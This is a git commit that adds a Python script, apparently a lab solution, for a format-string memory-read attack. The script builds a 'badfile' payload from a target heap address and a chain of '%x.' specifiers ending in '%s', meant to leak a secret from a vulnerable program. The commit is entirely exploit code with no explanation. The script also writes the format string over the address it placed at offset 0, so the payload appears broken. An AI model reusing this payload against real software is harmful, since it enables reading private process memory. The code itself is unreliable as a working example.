7479bc603519c5f6d87faf2671c5a46d5c8706f4
Ismayil Ismayilov <iismayilov4574@gmail.com>
2022-04-06 19:18:03 +0300

    Add Task 4 solutions

---
+++ Project 2/Task 4/task_4_read_heap.py
@@ -0,0 +1,17 @@
+#!/usr/bin/python3
+import sys
+
+N = 1500
+content = bytearray(0x0 for i in range(N))
+
+secret_address = 0x080b4008
+content[0:4] = (secret_address).to_bytes(4, byteorder='little')
+
+s = "%x." * 31 + "%s"
+
+fmt = (s).encode('latin-1')
+content[0:0 + len(fmt)] = fmt
+
+file = open("task_4_read_heap_badfile", "wb")
+file.write(content)
+file.close()
